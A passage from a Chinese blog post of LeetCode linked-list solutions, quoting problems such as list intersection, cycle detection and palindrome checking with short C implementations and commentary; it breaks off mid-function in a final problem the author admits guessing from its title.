链表相交</a></h2><blockquote><p>给定两个（单向）链表，判定它们是否相交并返回交点。请注意相交的定义基于节点的引用，而不是基于节点的值。换句话说，如果一个链表的第k个节点与另一个链表的第j个节点是同一节点（引用完全相同），则这两个链表相交。</p><p>示例 1：</p><p>输入：intersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3<br>输出：Reference of the node with value = 8<br>输入解释：相交节点的值为 8 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [4,1,8,4,5]，链表 B 为 [5,0,1,8,4,5]。在 A 中，相交节点前有 2 个节点；在 B 中，相交节点前有 3 个节点。</p><p>示例 2：</p><p>输入：intersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1<br>输出：Reference of the node with value = 2<br>输入解释：相交节点的值为 2 （注意，如果两个列表相交则不能为 0）。从各自的表头开始算起，链表 A 为 [0,9,1,2,4]，链表 B 为 [3,2,4]。在 A 中，相交节点前有 3 个节点；在 B 中，相交节点前有 1 个节点。</p><p>示例 3：</p><p>输入：intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2<br>输出：null<br>输入解释：从各自的表头开始算起，链表 A 为 [2,6,4]，链表 B 为 [1,5]。由于这两个链表不相交，所以 intersectVal 必须为 0，而 skipA 和 skipB 可以是任意值。<br>解释：这两个链表不相交，因此返回 null。</p><p>注意：</p><p>如果两个链表没有交点，返回 null 。<br>在返回结果后，两个链表仍须保持原有的结构。<br>可假定整个链表结构中没有循环。<br>程序尽量满足 O(n) 时间复杂度，且仅用 O(1) 内存。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/intersection-of-two-linked-lists-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>和上一题一模一样，套就完事了，看不懂的回去看上一题我的题解</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct ListNode *<span class="title">getIntersectionNode</span><span class="params">(struct ListNode *headA, struct ListNode *headB)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">node1</span> = <span class="title">headA</span>, *<span class="title">node2</span> = <span class="title">headB</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(node1!=node2)</span><br><span class="line">    &#123;</span><br><span class="line">        node1 = !node1 ? headB : node1-&gt;next;</span><br><span class="line">        node2 = !node2 ? headA : node2-&gt;next;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> node1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXWxyQ.png" alt="wXWxyQ.png"></p><h2 id="0x0F-二进制链表转整数"><a href="#0x0F-二进制链表转整数" class="headerlink" title="0x0F.二进制链表转整数"></a>0x0F.<a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer/" target="_blank" rel="noopener">二进制链表转整数</a></h2><blockquote><p>给你一个单链表的引用结点 head。链表中每个结点的值不是 0 就是 1。已知此链表是一个整数数字的二进制表示形式。</p><p>请你返回该链表所表示数字的 十进制值 。</p><p>示例 1：</p><p>输入：head = [1,0,1]<br>输出：5<br>解释：二进制数 (101) 转化为十进制数 (5)<br>示例 2：</p><p>输入：head = [0]<br>输出：0<br>示例 3：</p><p>输入：head = [1]<br>输出：1<br>示例 4：</p><p>输入：head = [1,0,0,1,0,0,1,1,1,0,0,0,0,0,0]<br>输出：18880<br>示例 5：</p><p>输入：head = [0,0]<br>输出：0</p><p>提示：</p><p>链表不为空。<br>链表的结点总数不超过 30。<br>每个结点的值不是 0 就是 1。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer" target="_blank" rel="noopener">https://leetcode-cn.com/problems/convert-binary-number-in-a-linked-list-to-integer</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>先将链表重构为其反转链表，再用常规的二进制数计算方法即可</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDecimalValue</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>, m = <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">NULL</span>, * <span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = head-&gt;next;</span><br><span class="line">        head-&gt;next = temp;</span><br><span class="line">        temp = head;</span><br><span class="line">        head = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(temp)</span><br><span class="line">    &#123;</span><br><span class="line">        n += temp-&gt;val ? m : <span class="number">0</span>;</span><br><span class="line">        m*=<span class="number">2</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfFYV.png" alt="wXfFYV.png"></p><h2 id="0x10-删除排序链表中的重复元素"><a href="#0x10-删除排序链表中的重复元素" class="headerlink" title="0x10.删除排序链表中的重复元素"></a>0x10.<a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list/" target="_blank" rel="noopener">删除排序链表中的重复元素</a></h2><blockquote><p>给定一个排序链表，删除所有重复的元素，使得每个元素只出现一次。</p><p>示例 1:</p><p>输入: 1-&gt;1-&gt;2<br>输出: 1-&gt;2<br>示例 2:</p><p>输入: 1-&gt;1-&gt;2-&gt;3-&gt;3<br>输出: 1-&gt;2-&gt;3</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list" target="_blank" rel="noopener">https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>使用一个指针来遍历链表，若下一个结点为值相同的结点时将该结点扔掉，自身指向下一个结点的下一个结点，否则自身变为下一个结点</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">deleteDuplicates</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(temp &amp;&amp; temp-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;val == temp-&gt;next-&gt;val)</span><br><span class="line">            temp-&gt;next = temp-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfnm9.png" alt="wXfnm9.png"></p><h2 id="0x11-环形链表"><a href="#0x11-环形链表" class="headerlink" title="0x11. 环形链表"></a>0x11.<a href="https://leetcode-cn.com/problems/linked-list-cycle/" target="_blank" rel="noopener"> 环形链表</a></h2><blockquote><p>给定一个链表，判断链表中是否有环。</p><p>如果链表中有某个节点，可以通过连续跟踪 next 指针再次到达，则链表中存在环。 为了表示给定链表中的环，我们使用整数 pos 来表示链表尾连接到链表中的位置（索引从 0 开始）。 如果 pos 是 -1，则在该链表中没有环。注意：pos 不作为参数进行传递，仅仅是为了标识链表的实际情况。</p><p>如果链表中存在环，则返回 true 。 否则，返回 false 。</p><p>进阶：</p><p>你能用 O(1)（即，常量）内存解决此问题吗？</p><p>示例 1：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist.png" alt="image.png"></p><p>输入：head = [3,2,0,-4], pos = 1<br>输出：true<br>解释：链表中有一个环，其尾部连接到第二个节点。<br>示例 2：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test2.png" alt="image.png"></p><p>输入：head = [1,2], pos = 0<br>输出：true<br>解释：链表中有一个环，其尾部连接到第一个节点。<br>示例 3：</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/07/circularlinkedlist_test3.png" alt="image.png"></p><p>输入：head = [1], pos = -1<br>输出：false<br>解释：链表中没有环。</p><p>提示：</p><p>链表中节点的数目范围是 [0, 104]<br>-105 &lt;= Node.val &lt;= 105<br>pos 为 -1 或者链表中的一个 有效索引 。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/linked-list-cycle" target="_blank" rel="noopener">https://leetcode-cn.com/problems/linked-list-cycle</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法一：快慢指针"><a href="#解法一：快慢指针" class="headerlink" title="解法一：快慢指针"></a>解法一：快慢指针</h3><p>老快慢指针人了，<strong>只要链表中存在环那么在遍历过程中步长不一的快慢指针肯定会相遇</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(struct ListNode *head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">ptr1</span> = <span class="title">head</span>, *<span class="title">ptr2</span> = <span class="title">head</span>-&gt;<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(ptr1 &amp;&amp; ptr2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(ptr1 == ptr2)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        ptr1 = ptr1-&gt;next;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!ptr2)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/09/PtGJv5EIz3RgAWd.png" alt="image.png"></p><h3 id="解法二：利用题目数据范围漏洞"><a href="#解法二：利用题目数据范围漏洞" class="headerlink" title="解法二：利用题目数据范围漏洞"></a>解法二：利用题目数据范围漏洞</h3><p>题目保证结点数量小于10000，那么<strong>只要遍历能循环超过10000次，链表中就必定存在回路</strong></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">hasCycle</span><span class="params">(struct ListNode *head)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(head)</span><br><span class="line">    &#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">        n++;</span><br><span class="line">        <span class="keyword">if</span>(n &gt; <span class="number">10000</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfJ6e.png" alt="wXfJ6e.png"></p><h2 id="0x12-面试题-02-01-移除重复节点"><a href="#0x12-面试题-02-01-移除重复节点" class="headerlink" title="0x12.面试题 02.01. 移除重复节点"></a>0x12.<a href="https://leetcode-cn.com/problems/remove-duplicate-node-lcci/" target="_blank" rel="noopener">面试题 02.01. 移除重复节点</a></h2><blockquote><p>编写代码，移除未排序链表中的重复节点。保留最开始出现的节点。</p><p>示例1:</p><p> 输入：[1, 2, 3, 3, 2, 1]<br> 输出：[1, 2, 3]<br>示例2:</p><p> 输入：[1, 1, 1, 1, 2]<br> 输出：[1, 2]<br>提示：</p><p>链表长度在[0, 20000]范围内。<br>链表元素在[0, 20000]范围内。<br>进阶：</p><p>如果不得使用临时缓冲区，该怎么解决？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/remove-duplicate-node-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/remove-duplicate-node-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：临时数组记录出现元素"><a href="#解法：临时数组记录出现元素" class="headerlink" title="解法：临时数组记录出现元素"></a>解法：临时数组记录出现元素</h3><p>由于题目数据范围较小，我们<strong>使用一个数组记录某个元素是否出现过即可</strong></p><p>线性时间复杂度为<strong>O</strong>(<strong>N</strong>)， 常数空间复杂度为<strong>O</strong>(<strong>1</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">removeDuplicateNodes</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="keyword">int</span> n[<span class="number">20005</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">head</span>;</span></span><br><span class="line">    n[temp-&gt;val] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(temp-&gt;next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n[temp-&gt;next-&gt;val])</span><br><span class="line">            temp-&gt;next = temp-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            temp = temp-&gt;next;</span><br><span class="line">            n[temp-&gt;val] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfs1S.png" alt="wXfs1S.png"></p><h3 id="进阶：两重循环"><a href="#进阶：两重循环" class="headerlink" title="进阶：两重循环"></a>进阶：两重循环</h3><blockquote><p>说是进阶实际上是emmm</p></blockquote><p>用时间换空间，每次遍历前先看该结点是不是在前面的链表中出现过了</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct ListNode* <span class="title">removeDuplicateNodes</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>((!head) || (!head-&gt;next))</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">head</span>, *<span class="title">temp2</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(temp)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = temp;</span><br><span class="line">        <span class="keyword">while</span>(temp2-&gt;next)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(temp2-&gt;next-&gt;val == temp-&gt;val)</span><br><span class="line">                temp2-&gt;next = temp2-&gt;next-&gt;next;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                temp2 = temp2-&gt;next;</span><br><span class="line">        &#125;              </span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[<img src="https://s1.ax1x.com/2020/09/23/wXfqB9.png" alt="wXfqB9.png"></p><blockquote><p><img src="https://s1.ax1x.com/2020/09/23/wXfL7R.png" alt="wXfL7R.png"></p><p>下面的是进阶解法<del>，这样的进阶不要也罢！</del></p></blockquote><h2 id="0x13-面试题-02-06-回文链表"><a href="#0x13-面试题-02-06-回文链表" class="headerlink" title="0x13.面试题 02.06. 回文链表"></a>0x13.<a href="https://leetcode-cn.com/problems/palindrome-linked-list-lcci/" target="_blank" rel="noopener">面试题 02.06. 回文链表</a></h2><blockquote><p>编写一个函数，检查输入的链表是否是回文的。</p><p>示例 1：</p><p>输入： 1-&gt;2<br>输出： false<br>示例 2：</p><p>输入： 1-&gt;2-&gt;2-&gt;1<br>输出： true </p><p>进阶：<br>你能否用 O(n) 时间复杂度和 O(1) 空间复杂度解决此题？</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/palindrome-linked-list-lcci" target="_blank" rel="noopener">https://leetcode-cn.com/problems/palindrome-linked-list-lcci</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：快慢指针-1"><a href="#解法：快慢指针-1" class="headerlink" title="解法：快慢指针"></a>解法：快慢指针</h3><p>老快慢指针人le</p><p><strong>快指针步长为2，慢指针步长为1，从头开始遍历，当快指针到NULL时慢指针刚好到链表中间，从这里开始将慢指针后面的链表构造为其逆序链表，再从头开始比较即可</strong></p><p>这个做法<strong>满足进阶解法的要求</strong>（<del>说实话我没想到其他更烂的解法</del></p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isPalindrome</span><span class="params">(struct ListNode* head)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!head || !head-&gt;next)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = <span class="title">NULL</span>, * <span class="title">temp2</span>, * <span class="title">ptr1</span> = <span class="title">head</span>, *<span class="title">ptr2</span> = <span class="title">head</span>;</span></span><br><span class="line">    <span class="keyword">while</span>(ptr2)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr1 = ptr1-&gt;next;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">        <span class="keyword">if</span>(!ptr2)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        ptr2 = ptr2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(ptr1)</span><br><span class="line">    &#123;</span><br><span class="line">        temp2 = ptr1-&gt;next;</span><br><span class="line">        ptr1-&gt;next = temp;</span><br><span class="line">        temp = ptr1;</span><br><span class="line">        ptr1 = temp2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(temp)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(temp-&gt;val != head-&gt;val)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        temp = temp-&gt;next;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXfz9K.png" alt="wXfz9K.png"></p><h2 id="0x14-删除链表M个结点后的N个结点（付费）"><a href="#0x14-删除链表M个结点后的N个结点（付费）" class="headerlink" title="0x14.删除链表M个结点后的N个结点（付费）"></a>0x14.<a href="https://leetcode-cn.com/problems/delete-n-nodes-after-m-nodes-of-a-linked-list/" target="_blank" rel="noopener">删除链表M个结点后的N个结点（付费）</a></h2><p>买不起leetcode会员，只好根据题目名字猜测内容进行盲打，<del>求富婆包养555</del></p><h3 id="解法：哨兵结点-1"><a href="#解法：哨兵结点-1" class="headerlink" title="解法：哨兵结点"></a>解法：哨兵结点</h3><p>为了防止从第一个结点就开始删除的情况的发生，故我们新建一个哨兵结点指向链表头</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">deleteNodes</span><span class="params">(ListNode* head, <span class="keyword">int</span> m, <span class="keyword">int</span> n)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> * <span class="title">temp</span> = (<span class="title">ListNode</span>*)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">ListNode</span>));</span></span><br><span class="line">    temp-&gt;next = head;</span><br><span class="line">    head = temp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;m;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        head = head-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        head-&gt;next = head-&gt;next-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    